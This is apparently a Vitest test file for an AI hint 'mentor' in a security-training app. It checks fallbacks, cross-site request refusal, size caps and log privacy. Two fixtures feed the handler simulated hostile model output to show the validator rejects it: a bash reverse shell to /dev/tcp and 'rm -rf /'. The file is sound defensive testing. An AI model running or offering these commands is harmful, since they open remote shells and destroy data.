import { afterEach, describe, expect, it, vi } from "vitest";
import { getMissionById, listMissions } from "@/features/missions/server";
import { handleHintRequest, type MentorLogEntry } from "@/features/mentor/handler";
import type { MentorConfig } from "@/features/mentor/config";
import type { MentorModelRunner, MentorModelStream } from "@/features/mentor/model";
import { authoredHint } from "@/features/mentor/client";
import type { HintTier, MentorStreamEvent } from "@/features/mentor/protocol";

/**
 * The mentor handler (md-files/10-ai-mentor.md, prompts 10.1, 10.2, 10.5). The model runner is
 * injected, so nothing here touches the network: it exercises the happy path, every fallback path,
 * and proves no learner text is logged.
 */

const ENABLED: MentorConfig = {
  hasApiKey: true,
  apiKey: "test-key",
  disabled: false,
  model: "test-model",
};

/** A model runner that yields the given text chunks, then reports usage. */
function runnerYielding(chunks: readonly string[]): MentorModelRunner {
  return () => {
    const stream: MentorModelStream = {
      async *[Symbol.asyncIterator]() {
        for (const chunk of chunks) yield chunk;
      },
      usage: async () => ({ inputTokens: 120, outputTokens: 25 }),
    };
    return stream;
  };
}

/** A model runner that throws while streaming (a model error or timeout). */
function runnerThrowing(): MentorModelRunner {
  return () => ({
    async *[Symbol.asyncIterator]() {
      throw new Error("model exploded");
    },
    usage: async () => {
      throw new Error("no usage");
    },
  });
}

function makeRequest(body: unknown): Request {
  return new Request("https://app.test/api/mentor/hint", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function readEvents(response: Response): Promise<MentorStreamEvent[]> {
  const text = await response.text();
  return text
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line !== "")
    .map((line) => JSON.parse(line) as MentorStreamEvent);
}

const validBody = {
  missionId: "net-01",
  objectiveId: "check-doors",
  tier: 1,
  transcript: [{ input: "netscan 10.40.2.0/24", output: "backup-01 is up" }],
};

afterEach(() => {
  vi.restoreAllMocks();
});

describe("handleHintRequest — model path", () => {
  it("streams the model's hint and ends with done (mode: model)", async () => {
    const log = vi.fn();
    const response = await handleHintRequest(makeRequest(validBody), {
      config: ENABLED,
      getMission: getMissionById,
      runner: runnerYielding([
        "Have a look at the open door. ",
        "Read the PORT column on `backup-01`. ",
        "The number before `/tcp` is your finding.",
      ]),
      log,
    });

    expect(response.headers.get("x-mentor-mode")).toBe("model");
    const events = await readEvents(response);
    const texts = events.filter((e) => e.type === "text");
    expect(texts.length).toBeGreaterThan(0);
    expect(events.at(-1)?.type).toBe("done");

    const assembled = texts.map((e) => (e.type === "text" ? e.text : "")).join("");
    expect(assembled).toContain("Read the PORT column on `backup-01`.");

    const entry = log.mock.calls[0]?.[0] as MentorLogEntry;
    expect(entry.fallback).toBe(false);
    expect(entry.outputTokens).toBe(25);
    expect(entry.missionId).toBe("net-01");
  });

  it("falls back and logs the rejected text when the model emits a payload", async () => {
    const log = vi.fn();
    const response = await handleHintRequest(makeRequest(validBody), {
      config: ENABLED,
      getMission: getMissionById,
      runner: runnerYielding(["Sure! Run `bash -i >& /dev/tcp/8.8.8.8/4444 0>&1` to win."]),
      log,
    });

    const events = await readEvents(response);
    expect(events.some((e) => e.type === "fallback")).toBe(true);
    expect(events.some((e) => e.type === "done")).toBe(false);

    const entry = log.mock.calls[0]?.[0] as MentorLogEntry;
    expect(entry.fallback).toBe(true);
    expect(entry.validationRejected).toBe(true);
    expect(entry.rejectedText).toContain("/dev/tcp");
  });

  it("falls back on a model error", async () => {
    const log = vi.fn();
    const response = await handleHintRequest(makeRequest(validBody), {
      config: ENABLED,
      getMission: getMissionById,
      runner: runnerThrowing(),
      log,
    });
    const events = await readEvents(response);
    expect(events).toEqual([{ type: "fallback", reason: "model_error" }]);
    expect((log.mock.calls[0]?.[0] as MentorLogEntry).fallbackReason).toBe("model_error");
  });
});

describe("handleHintRequest — fallback without a model call", () => {
  it("falls back when the API key is missing", async () => {
    const log = vi.fn();
    const response = await handleHintRequest(makeRequest(validBody), {
      config: { hasApiKey: false, apiKey: undefined, disabled: false, model: "test-model" },
      getMission: getMissionById,
      log,
    });
    expect(response.headers.get("x-mentor-mode")).toBe("fallback");
    expect(await readEvents(response)).toEqual([{ type: "fallback", reason: "disabled" }]);
  });

  it("falls back when the kill switch is set, even with a runner present", async () => {
    const runner = vi.fn(runnerYielding(["should not run"]));
    const response = await handleHintRequest(makeRequest(validBody), {
      config: { ...ENABLED, disabled: true },
      getMission: getMissionById,
      runner,
    });
    expect((await readEvents(response))[0]?.type).toBe("fallback");
    expect(runner).not.toHaveBeenCalled();
  });

  it("returns a 4xx fallback for an unknown mission", async () => {
    const response = await handleHintRequest(
      makeRequest({ ...validBody, missionId: "does-not-exist" }),
      { config: ENABLED, getMission: getMissionById, runner: runnerYielding(["x"]) },
    );
    expect(response.status).toBe(404);
    expect((await readEvents(response))[0]).toEqual({ type: "fallback", reason: "unknown_target" });
  });

  it("returns a 4xx fallback for a malformed body", async () => {
    const response = await handleHintRequest(
      new Request("https://app.test/api/mentor/hint", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: "not json",
      }),
      { config: ENABLED, getMission: getMissionById, runner: runnerYielding(["x"]) },
    );
    expect(response.status).toBe(400);
    expect((await readEvents(response))[0]?.type).toBe("fallback");
  });

  // Prompt 11.2: a text/plain POST needs no CORS preflight, so any site could send one from its
  // visitors' browsers. Only JSON is read, and a browser has to ask before sending JSON cross-site.
  it("refuses a body that isn't JSON (415), before any model call", async () => {
    const runner = vi.fn(runnerYielding(["x"]));
    const response = await handleHintRequest(
      new Request("https://app.test/api/mentor/hint", {
        method: "POST",
        headers: { "content-type": "text/plain" },
        body: JSON.stringify(validBody),
      }),
      { config: ENABLED, getMission: getMissionById, runner },
    );
    expect(response.status).toBe(415);
    expect((await readEvents(response))[0]).toEqual({
      type: "fallback",
      reason: "invalid_request",
    });
    expect(runner).not.toHaveBeenCalled();
  });

  it("refuses a request from another site (403), before any model call", async () => {
    const crossSite: Record<string, string>[] = [
      { "sec-fetch-site": "cross-site" },
      { "sec-fetch-site": "same-site" },
      { origin: "https://elsewhere.example" },
      { origin: "not a url" },
    ];
    for (const headers of crossSite) {
      const runner = vi.fn(runnerYielding(["x"]));
      const response = await handleHintRequest(
        new Request("https://app.test/api/mentor/hint", {
          method: "POST",
          headers: { "content-type": "application/json", ...headers },
          body: JSON.stringify(validBody),
        }),
        { config: ENABLED, getMission: getMissionById, runner },
      );
      expect(response.status, JSON.stringify(headers)).toBe(403);
      expect((await readEvents(response))[0]).toEqual({ type: "fallback", reason: "cross_site" });
      expect(runner).not.toHaveBeenCalled();
    }
  });

  it("accepts the app's own pages: same-origin, or an Origin matching the host", async () => {
    const sameSite: Record<string, string>[] = [
      { "sec-fetch-site": "same-origin", origin: "https://app.test" },
      { origin: "https://app.test" },
      {},
    ];
    for (const headers of sameSite) {
      const response = await handleHintRequest(
        new Request("https://app.test/api/mentor/hint", {
          method: "POST",
          headers: { "content-type": "application/json; charset=utf-8", ...headers },
          body: JSON.stringify(validBody),
        }),
        { config: ENABLED, getMission: getMissionById, runner: runnerYielding(["Try ls."]) },
      );
      expect(response.headers.get("x-mentor-mode"), JSON.stringify(headers)).toBe("model");
    }
  });

  it("stops reading a body sent in chunks with no length once it passes the cap", async () => {
    let pulled = 0;
    const endless = new ReadableStream<Uint8Array>({
      pull(controller) {
        pulled += 1;
        controller.enqueue(new TextEncoder().encode(`{"x":"${"y".repeat(4096)}`));
      },
    });
    const response = await handleHintRequest(
      new Request("https://app.test/api/mentor/hint", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: endless,
        duplex: "half",
      } as RequestInit),
      { config: ENABLED, getMission: getMissionById, runner: runnerYielding(["x"]) },
    );
    expect(response.status).toBe(413);
    expect((await readEvents(response))[0]).toEqual({
      type: "fallback",
      reason: "request_too_large",
    });
    // 16 KB of 4 KB chunks: it gave up after a handful, not after reading forever.
    expect(pulled).toBeLessThan(10);
  });

  it("falls back for an over-cap body", async () => {
    const huge = { ...validBody, transcript: [{ input: "x", output: "y".repeat(200_000) }] };
    const response = await handleHintRequest(makeRequest(huge), {
      config: ENABLED,
      getMission: getMissionById,
      runner: runnerYielding(["x"]),
    });
    expect(response.status).toBe(413);
    expect((await readEvents(response))[0]).toEqual({
      type: "fallback",
      reason: "request_too_large",
    });
  });
});

describe("handleHintRequest — logs no learner text", () => {
  const secret = "SUPERSECRETLEARNERTEXTdiscoverypassword";

  it("never records the transcript, even when the model output is rejected", async () => {
    const log = vi.fn();
    const response = await handleHintRequest(
      makeRequest({
        ...validBody,
        transcript: [{ input: `echo ${secret}`, output: secret }],
      }),
      {
        config: ENABLED,
        getMission: getMissionById,
        // The model output (a payload) is what gets logged when rejected — it must not carry the
        // learner's transcript text, which this model output deliberately does not.
        runner: runnerYielding(["Here is a shell: rm -rf / to fix it."]),
        log,
      },
    );
    await readEvents(response); // drain the stream so the log line is written
    const serialised = JSON.stringify(log.mock.calls);
    expect(serialised).not.toContain(secret);
    // The rejected model text is logged (truncated), proving the log carries model text, not learner text.
    expect((log.mock.calls[0]?.[0] as MentorLogEntry).rejectedText).toContain("rm -rf /");
  });

  it("the default console logger emits metadata only, no learner text", async () => {
    const spy = vi.spyOn(console, "log").mockImplementation(() => {});
    const response = await handleHintRequest(
      makeRequest({ ...validBody, transcript: [{ input: `cat ${secret}`, output: secret }] }),
      {
        config: ENABLED,
        getMission: getMissionById,
        runner: runnerYielding(["Have a look at the open door on `backup-01`."]),
      },
    );
    await readEvents(response); // drain the stream so the default logger runs
    const output = spy.mock.calls.map((call) => String(call[0])).join("\n");
    expect(output).toContain('"feature":"mentor"');
    expect(output).not.toContain(secret);
  });
});

/**
 * The deterministic fallback is the floor the whole mentor stands on, and hint.v2 must not have
 * moved it: with no API key, no request reaches a model and the learner still sees the authored
 * hint, word for word from the mission file. This walks every mission, every objective with hints
 * and every tier, so it stays true as missions are added.
 */
describe("no API key: every hint is still the authored text", () => {
  const NO_KEY: MentorConfig = {
    hasApiKey: false,
    apiKey: undefined,
    disabled: false,
    model: "test-model",
  };

  it("never calls a model and always falls back, for every mission, objective and tier", async () => {
    const missions = listMissions();
    expect(missions.length).toBeGreaterThan(0);

    const runner = vi.fn(runnerYielding(["should not run"]));
    let checked = 0;

    for (const mission of missions) {
      for (const objective of mission.objectives) {
        const tiers = mission.hints[objective.id];
        if (!tiers) continue;
        for (let tier = 1; tier <= tiers.length; tier += 1) {
          const response = await handleHintRequest(
            makeRequest({
              missionId: mission.id,
              objectiveId: objective.id,
              tier,
              transcript: [{ input: "whoami", output: "recruit" }],
            }),
            { config: NO_KEY, getMission: getMissionById, runner, log: vi.fn() },
          );

          expect(response.headers.get("x-mentor-mode")).toBe("fallback");
          expect(await readEvents(response)).toEqual([{ type: "fallback", reason: "disabled" }]);

          // What the client shows on a fallback is the authored tier, verbatim from the YAML.
          expect(authoredHint(mission, objective.id, tier as HintTier)).toBe(tiers[tier - 1]);
          expect(authoredHint(mission, objective.id, tier as HintTier)).not.toBe("");
          checked += 1;
        }
      }
    }

    expect(checked).toBeGreaterThan(0);
    expect(runner).not.toHaveBeenCalled();
  });
});
